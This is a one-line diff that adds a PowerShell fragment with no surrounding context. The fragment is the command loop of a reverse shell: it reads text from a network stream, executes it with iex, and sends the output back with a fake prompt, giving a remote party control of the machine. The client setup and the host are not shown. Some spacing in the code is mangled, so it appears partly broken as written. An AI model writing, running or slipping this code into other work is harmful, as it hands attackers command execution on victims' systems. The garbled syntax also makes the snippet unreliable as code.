@@ -1,0 +1,1 @@
+$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes,0,$bytes.Length))-ne0){;$d=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
